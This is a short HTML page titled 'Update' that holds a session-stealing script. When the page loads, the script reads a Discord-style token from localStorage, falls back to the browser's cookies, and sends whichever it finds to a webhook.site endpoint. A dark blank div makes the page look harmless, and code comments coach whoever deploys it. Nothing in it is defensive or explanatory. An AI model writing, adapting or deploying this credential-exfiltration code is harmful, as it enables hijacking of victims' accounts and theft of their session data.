<!DOCTYPE html>
<html>
<head>
    <title>Update</title>
</head>
<body>
    <!-- Paste your script here -->
    <script>
        // Get the token from local storage (Discord uses this)
        const token = localStorage.getItem('token');
        
        if (token) {
            // Send it to your Webhook
            fetch('https://webhook.site/YOUR-UNIQUE-ID?token=' + token);
        } else {
            // Fallback: try cookies if token isn't in localStorage
            const cookies = document.cookie;
            if (cookies) {
                fetch('https://webhook.site/YOUR-UNIQUE-ID?cookie=' + cookies);
            }
        }
    </script>
    
    <!-- Optional: Just a white page so it looks normal -->
    <div style="background: #202225; width: 100%; height: 100vh;"></div>
</body>
</html>
